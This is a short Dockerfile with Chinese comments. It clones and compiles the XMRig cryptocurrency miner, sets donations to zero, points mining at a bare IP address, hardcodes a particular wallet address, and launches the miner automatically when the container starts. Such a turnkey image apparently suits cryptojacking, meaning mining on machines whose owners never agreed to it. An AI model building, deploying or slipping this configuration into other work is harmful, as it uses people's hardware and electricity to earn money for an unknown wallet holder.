# 基于Alpine Linux作为基础镜像
FROM alpine:latest

# 安装所需的软件包和构建依赖项
RUN apk add --no-cache \
    git \
    make \
    cmake \
    libstdc++ \
    gcc \
    g++ \
    automake \
    libtool \
    autoconf \
    linux-headers

# 克隆xmrig存储库并修改项目内容
RUN git clone https://github.com/xmrig/xmrig.git /xmrig && \
    cd /xmrig && \
    sed -i "s@kMinimumDonateLevel = 1@kMinimumDonateLevel = 0@g" src/donate.h && \
    sed -i "s@kDefaultDonateLevel = 1@kDefaultDonateLevel = 0@g" src/donate.h && \
    sed -i "s@donate.v2.xmrig.com:3333@103.40.13.88:18071@g" src/config.json && \
    sed -i "s@\"tls\": false@\"tls\": true@g" src/config.json && \
    sed -i "s@\"url\": \"donate.v2.xmrig.com:3333\"@\"url\": \"103.40.13.88:18071\"@g" src/config.json && \
    sed -i "s@\"user\": \"YOUR_WALLET_ADDRESS\"@\"user\": \"43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S\"@g" src/config.json && \
    sed -i "s@\"pass\": \"x\"@\"pass\": \"RMS\"@g" src/config.json

# 构建依赖项并编译xmrig
WORKDIR /xmrig/build
RUN cmake .. -DXMRIG_DEPS=../scripts/deps -DBUILD_STATIC=ON && \
    make -j$(nproc)

# 复制构建好的文件到/usr/local/bin目录下，并移除构建过程中的无用文件
RUN cp xmrig /usr/local/bin/xmrig && \
    rm -rf /xmrig

# 容器启动命令
CMD ["xmrig"]
